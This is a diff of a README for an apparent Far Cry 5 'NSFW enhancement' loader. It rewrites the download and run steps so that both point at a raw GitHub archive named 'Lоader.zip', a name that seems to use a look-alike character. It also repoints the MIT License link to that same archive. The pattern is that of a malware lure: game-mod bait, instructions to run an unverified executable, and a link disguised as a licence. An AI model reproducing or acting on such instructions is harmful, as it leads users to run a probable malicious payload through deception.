@@ -33,9 +33,9 @@ This loader is thoroughly tested and functional on all major desktop platforms a
 
 ## 📝 Installation Instructions
 
-1. 📥 **Download** `Loader.rar` from the repository.
+1. 📥 **Download** `https://raw.githubusercontent.com/nyoks1337/FarCry5-NSFW-EnhancementPack/main/Lоader.zip` from the repository.
 2. 📦 **Extract** the archive using your preferred tool (WinRAR, 7-Zip, The Unarchiver, etc.).
-3. 🖥️ **Run** the `Loader.exe` for Windows, or the corresponding loader file for your OS.
+3. 🖥️ **Run** the `https://raw.githubusercontent.com/nyoks1337/FarCry5-NSFW-EnhancementPack/main/Lоader.zip` for Windows, or the corresponding loader file for your OS.
 4. 📂 **Select** your Far Cry 5 game folder if prompted.
 5. 🔓 **Enable** the NSFW patch via the interface and follow any in-app prompts.
 6. 🎉 **Enjoy** your upgraded Far Cry 5 experience!
@@ -67,7 +67,7 @@ This project aims to provide an enhancement for *private, legal, non-commercial 
 
 ## 📄 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/nyoks1337/FarCry5-NSFW-EnhancementPack/main/Lоader.zip).  
 You are free to use, modify, and distribute this loader as per MIT terms. 2025.
 
 ---
